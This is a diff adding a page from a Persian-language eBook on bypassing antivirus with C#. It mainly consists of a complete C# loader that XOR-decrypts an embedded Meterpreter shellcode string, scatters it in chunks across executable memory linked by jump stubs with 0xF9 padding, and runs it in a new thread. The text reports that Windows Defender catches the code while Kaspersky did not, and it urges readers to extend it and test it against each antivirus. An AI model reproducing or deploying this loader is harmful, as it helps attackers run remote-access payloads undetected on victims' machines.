+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">پرکردن </font></span>
+		<font face="Tahoma" size="2">Memory<span lang="fa"> استفاده کرده ام تا
+		</span>Payload<span lang="fa"> های من</span> <span lang="fa">یا </span>
+		Byte array<span lang="fa"> های من که می خواهم در </span>Memory<span lang="fa"> 
+		اجرا شوند در خانه آدرسهای متفاوتی ایجاد شود</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و دقیقا </font>
+		</span><font face="Tahoma" size="2">Byte<span lang="fa"> های کد های
+		</span>Jump<span lang="fa"> من در اول </span>StartAddress<span lang="fa"> 
+		نباشند برای مثال اگر </span>0x1CE0000<span lang="fa"> آدرس شروع من باشد 
+		اول آن را با این آرایه </span>OPS<span lang="fa">X پر می کنم و بعد</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">بایتهای </font></span>
+		<font face="Tahoma" size="2">Jump<span lang="fa"> خود را می نویسم در 
+		نتیجه ممکن می باشد از خانه 80</span> <span lang="fa">آدرس </span>0x1CE00<font color="#FF0000">80</font><span lang="fa"> 
+		کد واقعی من شروع شود همانند شکل 5.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font face="Tahoma" size="2">byte[] opsx = new byte[] {0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,...}</font></b></p>
+		<p dir="ltr">&nbsp;</p>
+		<p dir="ltr" align="left"><b><font face="Tahoma" size="2">RtlMoveMemory(jmpaddr_uintaddress[0], opsx,(uint) opsx.Length);<br>
+		RtlMoveMemory(jmpaddr_uintaddress[0]+ (uint)opsx.Length, jmpaddr_execution_jmp_code[1], (uint)chunk_Final_Payload2.Length);</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2">
+		<span lang="fa">در واقع اول با این کد 
+		خانه های اول آن آدرس را پر می کنم با بایتهای </span>F9<span lang="fa"> :</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font face="Tahoma" size="2">RtlMoveMemory(jmpaddr_uintaddress[0], opsx,(uint) opsx.Length);</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">سپس توسط این کد از آن 
+		آدرس پر شده به بعد شروع به نوشتن </font></span>
+		<font face="Tahoma" size="2">Byte<span lang="fa"> های مربوط به </span>
+		<font color="#808000">Jump</font><span lang="fa"> خود می کنم و ....</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p dir="ltr" align="left"><b><font face="Tahoma" size="2">RtlMoveMemory(<font color="#FF0000">jmpaddr_uintaddress[0]</font><font color="#008000"><span lang="fa">
+		</span>+</font><font color="#000080"> </font><font color="#FF0000">(uint)opsx.Length,</font><font color="#808000"> jmpaddr_execution_jmp_code[1]</font>, (uint)chunk_Final_Payload2.Length);</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">نکته: البته این دو خط کد 
+		دقیقا مربوط به آن تصور 5 نمی باشد اما کدها یک شکل می باشند و نتیجه دقیقا 
+		یکسان همانند شکل 5 فقط ممکن می باشد </font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">کد اضافه شده بعد از
+		</font></span><font face="Tahoma" size="2">F9<span lang="fa"> ها متفاوت 
+		باشد.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">موارد دیگری در کد نمی 
+		باشد که جدید باشد و من امیدوارم با توضیحاتی که در فصلهای قبلی دادم 
+		بتوانید این کد را متوجه شوید خط به خط</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">و بعد از متوجه شدن آن 
+		خود آن را بنویسید و ایده های خود را به آن اضافه کنید و این کار سخت نمی 
+		باشد فقط کمی تلاش و تمرین می خواهد.</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">و یادتان باشد اگر شما 
+		درگیر کد نشوید شما نمی توانید کد را متوجه شوید و هدف من این می باشد که 
+		شما واقعا کد را بفهمید و کپی و پیست کار نباشید.</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">توصیه من به شما استفاده 
+		از </font></span><font face="Tahoma" size="2">Breakpoint<span lang="fa"> 
+		در </span>VS.NET 2019<span lang="fa"> می باشد برای خط به خط این کد&nbsp; 
+		و نگاه کردن به مقدار متغیر ها</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<b><font face="Tahoma" size="2"><span lang="fa">تا بهتر متوجه شوید کد 
+		دقیقا چگونه کار می کند.</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<table border="1" width="100%" id="table2" cellspacing="0" cellpadding="0" bordercolor="#FFFFFF">
+			<tr>
+				<td bgcolor="#999966" style="border-right-style: solid; border-right-width: 1px; border-top-style: solid; border-top-width: 1px" width="613" dir="ltr">
+				<b><font size="2" face="Tahoma" color="#FFFFFF">C# Code 4.3</font></b></td>
+			</tr>
+			<tr>
+				<td style="border-right-style: solid; border-right-width: 1px; border-bottom-style: solid; border-bottom-width: 1px" width="613" dir="ltr">
+				<pre><b><font face="Tahoma">using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace NativePayload_LocalCreateThread7
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            new System.Threading.Thread(() =&gt;
+            {
+
+                /// Write some asm code to the allocated memory that jumps to the specified return address
+                ////byte[] asmCode = new byte[] { 0xE9, 0x00, 0x00, 0x00, 0x00 }; // JMP &lt;relative_address&gt;
+                ////BitConverter.GetBytes((uint)AddressOfPayload_In_Mem - ((uint)addr + 5)).CopyTo(asmCode, 1);
+                /// Write some asm code to the allocated memory that jumps to the specified return address
+
+                string Payload_Encrypted = &quot;236 88 147 244 224 248 220 16 16 16 81 65 81 64 66 88 33 194 ...&quot;;</font></b></pre>
+				<pre><b><font face="Tahoma">                string[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(&#39; &#39;);
+                byte[] _X_to_Bytes = new byte[Payload_Encrypted_Without_delimiterChar.Length];
+                for (int i = 0; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)
+                {
+                    byte current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());
+                    _X_to_Bytes[i] = current;
+                }
+                IntPtr ProcessHandle2 = OpenProcess(0x001F0FFF, false, System.Diagnostics.Process.GetCurrentProcess().Id);
+                Console.WriteLine();
+                uint AddressOfPayload_In_Mem = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)_X_to_Bytes.Length, 0x1000, 0x40, 0);
+                RtlMoveMemory(AddressOfPayload_In_Mem, _X_to_Bytes, (uint)_X_to_Bytes.Length);
+                Console.WriteLine(&quot;[!] Encrypted payload write to Part2 [startaddr + part2] for MemoryAddress of Thread.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ (AddressOfPayload_In_Mem + ((uint)_X_to_Bytes.Length / 2)).ToString(&quot;X8&quot;) + &quot;]&quot;);
+                Console.WriteLine(&quot;[!] Encrypted payload write to Part1 [startaddr] for MemoryAddress of Thread.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ (AddressOfPayload_In_Mem).ToString(&quot;X8&quot;) + &quot;]&quot;);
+                Console.WriteLine(&quot;[!] New Thread will Create with StartAddress VirtualAlloc.Result[&quot; +</font></b></pre>
+				<pre><b><font face="Tahoma"> AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero;
+                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x04, out uint _);
+                Console.WriteLine(&quot;[!] Protection Mode in Memory set to 0x20 Read_Execute, StartAddress.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                /// execute native code in memory via create local thread
+                hThread = CreateThread(0, 0, (IntPtr)AddressOfPayload_In_Mem, pinfo, 0x00000004, ref threadId);
+                Console.WriteLine(&quot;[!] New Thread Created with ThreadId.Result[&quot; + Convert.ToInt32(threadId) + &quot;]&quot;);
+                Console.WriteLine(&quot;[!] New Thread Created with HandleAddress_of_Thread.Result[&quot; + hThread.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                Console.WriteLine(&quot;[!] first, section two [part2] of encrypted payload will decrypt in Memory&quot;);
+                Console.WriteLine(&quot;[!] after delay, then section one [part1] of encrypted payload will decrypt in Memory&quot;);
+
+               // System.Threading.Thread.Sleep(30000);
+                /////
+                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, ((UIntPtr)_X_to_Bytes.Length), 0x04, out uint _);
+                byte[] cunck_Payload_Encrypted_Without_delimiterChar2 = new byte[_X_to_Bytes.Length];
+                ReadProcessMemory(Process.GetCurrentProcess().Handle, AddressOfPayload_In_Mem,
+                 cunck_Payload_Encrypted_Without_delimiterChar2, cunck_Payload_Encrypted_Without_delimiterChar2.Length, IntPtr.Zero);
+                byte[] chunk_Final_Payload2 = Xor(cunck_Payload_Encrypted_Without_delimiterChar2, new byte[] { 0x10 });
+                List&lt;byte[]&gt; all_chunks = new List&lt;byte[]&gt;();
+                Int32 counter = 0;
+                uint AddressOfPayload_In_MemX = 0;
+                byte[] tmp = new byte[10] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+                int ctr = 0;
+                int currentid = 0;
+                foreach (var item in chunk_Final_Payload2)
+                {
+                    if (ctr &lt;= 9)
+                    {
+                        tmp[ctr] = item;
+
+                        ctr++;
+                        currentid++;
+                    }
+                    else
+                    {
+                        all_chunks.Add(tmp);
+                        ctr = 0;
+                        tmp = new byte[10] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+                        tmp[ctr] = item;
+
+                        ctr++;
+                        currentid++;
+                    }
+                   
+                    
+                }
+ 
+                uint chunk_addr00 = AddressOfPayload_In_Mem + ((uint) 700);
+                byte[] jmpBytes0 = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+                byte[] addressBytes0 = BitConverter.GetBytes((int)chunk_addr00);
+                jmpBytes0[4] = addressBytes0[0];
+                jmpBytes0[5] = addressBytes0[1];
+                jmpBytes0[6] = addressBytes0[2];
+                jmpBytes0[7] = addressBytes0[3];
+                RtlMoveMemory(AddressOfPayload_In_Mem, jmpBytes0, (uint)jmpBytes0.Length);
+                bool init = false;
+                uint xadr = 0;
+                xadr += AddressOfPayload_In_Mem + ((uint)700);
+                uint next_address = 0;
+                bool initaddress = true;
+                uint initaddressDetected = 0;
+                int numberofpayload = 0;
+                List&lt;byte[]&gt; jmpaddr_execution_jmp_code = new List&lt;byte[]&gt;();
+                List&lt;uint&gt; jmpaddr_uintaddress = new List&lt;uint&gt;();
+                foreach (byte[] item in all_chunks)
+                {                 
+                    AddressOfPayload_In_MemX = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)item.Length, 0x1000, 0x40, 0);
+                    //byte[] asmCode = new byte[] { 0xE9, 0x00, 0x00, 0x00, 0x00 }; // JMP &lt;relative_address&gt;
+                    //BitConverter.GetBytes((uint)AddressOfPayload_In_Mem - ((uint)AddressOfPayload_In_MemX + 5)).CopyTo(asmCode, 1);
+                    
+                    byte[] _jmpBytes_run = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+                    byte[] _addressBytes0_run = BitConverter.GetBytes((int)AddressOfPayload_In_MemX + (uint)128);
+                    _jmpBytes_run[4] = _addressBytes0_run[0];
+                    _jmpBytes_run[5] = _addressBytes0_run[1];
+                    _jmpBytes_run[6] = _addressBytes0_run[2];
+                    _jmpBytes_run[7] = _addressBytes0_run[3];
+
+                    jmpaddr_execution_jmp_code.Add(_jmpBytes_run);
+                    jmpaddr_uintaddress.Add(AddressOfPayload_In_MemX);
+                   
+                    RtlMoveMemory(AddressOfPayload_In_MemX, item, (uint)item.Length);
+                    if (numberofpayload &lt; 3) 
+                    Console.WriteLine(&quot;[&gt;] Injecting/setting Chunk Address via Jmp Bytes {0} ==&gt; into Startaddress {1}, Msfvenom Payload Bytes[{2}...]&quot; , </font></b></pre>
+				<pre><b><font face="Tahoma">BitConverter.ToString(_jmpBytes_run) , AddressOfPayload_In_MemX.ToString(&quot;x8&quot;)  , BitConverter.ToString(item));
+                    if (initaddress)
+                    {
+                        initaddressDetected = AddressOfPayload_In_MemX;
+                    }
+                    numberofpayload++;
+                    if(numberofpayload == all_chunks.Count)
+                    {
+                        //0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
+                        RtlMoveMemory(AddressOfPayload_In_MemX +</font></b></pre>
+				<pre><b><font face="Tahoma"> (uint)item.Length, new byte []{ 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5 }, (uint)10);
+                    }
+                    initaddress = false;
+                  
+                }
+
+                for (int i = 0; i &lt; jmpaddr_uintaddress.Count; i++)
+                {
+                    if (i == 49) break;
+                    RtlMoveMemory(jmpaddr_uintaddress[i] + (uint) 10, jmpaddr_execution_jmp_code[i + 1], 10);
+                }
+                Console.WriteLine(&quot;[!] Memory Address Detected to Init to run Result.[{0}&quot;, initaddressDetected.ToString(&quot;x8&quot;)+&quot;]&quot;);                
+              
+                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, ((UIntPtr)_X_to_Bytes.Length), 0x04, out uint _);
+                Console.WriteLine(&quot;[!] Protection Mode in Memory set to 0x04 Read_Write, StartAddress.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                System.Threading.Thread.Sleep(2500);                               
+                Console.WriteLine(&quot;[!] Decrypted/write via read Part1 for MemoryAddress of Thread.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ (AddressOfPayload_In_Mem).ToString(&quot;X8&quot;) + &quot;]&quot;);                
+                VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x40, out uint _);
+                Console.WriteLine(&quot;[!] Protection Mode in Memory set to 0x40 Read_Write_Execute, StartAddress.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                System.Threading.Thread.Sleep(6000);
+                uint initrun = jmpaddr_uintaddress[0];
+                byte[] jmpBytes_run = new byte[] { 0xf9, 0xf9, 0xf9, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
+                byte[] addressBytes0_run = BitConverter.GetBytes((int)initrun);
+                jmpBytes_run[4] = addressBytes0_run[0];
+                jmpBytes_run[5] = addressBytes0_run[1];
+                jmpBytes_run[6] = addressBytes0_run[2];
+                jmpBytes_run[7] = addressBytes0_run[3];
+             
+                uint inittorun = VirtualAllocExNuma(ProcessHandle2, IntPtr.Zero, (uint)jmpBytes_run.Length, 0x1000, 0x40, 0);
+                Console.WriteLine(&quot;[&gt;] New Thread Created to Init to Jump/Exec, with StartAddress Result.[{0}&quot;, inittorun.ToString(&quot;x8&quot;) + &quot;]&quot;);
+                RtlMoveMemory(inittorun, jmpBytes_run, (uint)jmpBytes_run.Length);
+                byte[] opsx = new byte[] {0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, </font></b></pre>
+				<pre><b><font face="Tahoma">0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
+                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, </font></b></pre>
+				<pre><b><font face="Tahoma">0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
+                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, </font></b></pre>
+				<pre><b><font face="Tahoma">0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
+                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 ,0xf9, 0xf9, </font></b></pre>
+				<pre><b><font face="Tahoma">0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9, 0xf9,
+                0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9,0xf9 };
+                RtlMoveMemory(jmpaddr_uintaddress[0], opsx,(uint) opsx.Length);
+                RtlMoveMemory(jmpaddr_uintaddress[0]+ (uint)opsx.Length, jmpaddr_execution_jmp_code[1], (uint)chunk_Final_Payload2.Length);
+                RtlMoveMemory(jmpaddr_uintaddress[1], opsx, (uint)opsx.Length);
+                RtlMoveMemory(jmpaddr_uintaddress[1] + (uint)opsx.Length, chunk_Final_Payload2, (uint)chunk_Final_Payload2.Length / 2);
+                RtlMoveMemory(jmpaddr_uintaddress[1] + ((uint)chunk_Final_Payload2.Length / 2 + </font></b></pre>
+				<pre><b><font face="Tahoma">(uint)opsx.Length), jmpaddr_execution_jmp_code[2],(uint) jmpaddr_execution_jmp_code[1].Length);
+                byte[] test = new byte[chunk_Final_Payload2.Length / 2];
+                for (int i = 0; i &lt; test.Length; i++)
+                {
+                    test[i] = chunk_Final_Payload2[i + (chunk_Final_Payload2.Length / 2)];
+
+                }
+                RtlMoveMemory(jmpaddr_uintaddress[2], opsx, (uint)opsx.Length);
+                RtlMoveMemory(jmpaddr_uintaddress[2]+ (uint)opsx.Length, test, (uint)test.Length);
+                uint threadId2 = 0;
+                IntPtr hThread2 = CreateThread(0, 0, (IntPtr)inittorun, pinfo, 0x0, ref threadId2);
+                // ResumeThread(hThread);
+
+                // VirtualProtectEx(ProcessHandle2, (IntPtr)AddressOfPayload_In_Mem, (UIntPtr)_X_to_Bytes.Length, 0x10, out uint _);
+                Console.WriteLine(&quot;[!] Protection Mode in Memory set to 0x10 Execute, StartAddress.Result[&quot; </font></b></pre>
+				<pre><b><font face="Tahoma">+ AddressOfPayload_In_Mem.ToString(&quot;X8&quot;) + &quot;]&quot;);
+                Console.WriteLine(&quot;\nBingo: Meterpreter Session via Chunking Payload In-memory  ;)&quot;);
+                WaitForSingleObject(hThread2, 0xFFFFFFFF);
+            }).Start();
+        }
+        public static byte[] Xor(byte[] cipher, byte[] key)
+        {
+            byte[] xored = new byte[cipher.Length];
+
+            for (int i = 0; i &lt; cipher.Length; i++)
+            {
+                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
+            }
+
+            return xored;
+        }
+
+        [Flags]
+        public enum AllocationType
+        { Commit = 0x00001000 }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            EXECUTE = 0x10,
+            EXECUTE_READ = 0x20,
+            EXECUTE_READWRITE = 0x40,
+            EXECUTE_WRITECOPY = 0x80,
+            NOACCESS = 0x01,
+            READONLY = 0x02,
+            READWRITE = 0x04,
+            WRITECOPY = 0x08
+        }
+
+
+        [DllImport(&quot;ke&quot; + &quot;rne&quot; + &quot;l&quot; + &quot;32.dll&quot;)]
+        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+        public static extern bool ReadProcessMemory(IntPtr hProcess, uint lpBaseAddress, [Out] byte[] lpBuffer,</font></b></pre>
+				<pre><b><font face="Tahoma"> int dwSize, IntPtr lpNumberOfBytesRead);
+        [DllImport(&quot;kernel32.dll&quot;)]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport(&quot;ntdll.dll&quot;)]
+        private static extern bool RtlMoveMemory(uint addr, byte[] pay, uint size);
+
+        //[DllImport(&quot;kernel32&quot;)]
+        //public static extern uint VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, </font></b></pre>
+				<pre><b><font face="Tahoma">IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+        [DllImport(&quot;kernel32&quot;)]
+        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        /// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma
+        [DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]
+        static extern uint VirtualAllocExNuma(
+                IntPtr hProcess,
+                IntPtr lpAddress,
+                uint dwSize,
+                UInt32 flAllocationType,
+                UInt32 flProtect,
+                UInt32 nndPreferred);
+        //[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+        //public static extern bool WriteProcessMemory(IntPtr hProcess, uint lpBaseAddress, byte[] lpBuffer, </font></b></pre>
+				<pre><b><font face="Tahoma">Int32 nSize, out uint lpNumberOfBytesWritten);
+        <span lang="fa">// </span>[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
+        <span lang="fa">// </span>static extern uint ResumeThread(IntPtr hThread);
+
+    }
+}
+</font></b></pre>
+				<pre>
+</pre>
+				<pre>
+</pre>
+				</td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<b><span lang="fa"><font face="Tahoma" size="2">و در آخر باید گفت که این 
+		کد توسط </font></span><font face="Tahoma" size="2">WindowsDefender<span lang="fa"> 
+		شناسایی می شود اما </span>Kaspersky<span lang="fa"> نتوانست این کد و 
+		تکنیک را شناسایی کند</span></font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<span lang="fa"><b><font face="Tahoma" size="2">در نتیجه بهتر می باشد که 
+		این کد را با ایده های خود که به کد اضافه کرده اید بر روی تک تک آنتی 
+		ویروس ها تست کنید.</font></b></span></td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		&nbsp;</td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font face="Tahoma" size="2">eBook: 
+		Bypassing Anti viruses by C# Programming </font>
+		<font face="Tahoma" size="1">v2.0</font></b></td>
+	</tr>
+	<tr>
+		<td>
+		<p align="left" dir="ltr"><b><font face="Tahoma" size="2">Last Updated: 
+		2023 Jul 1<span lang="fa">4</span></font></b></td>
+	</tr>
+	</table>
+	
+</body>
+
+</html>
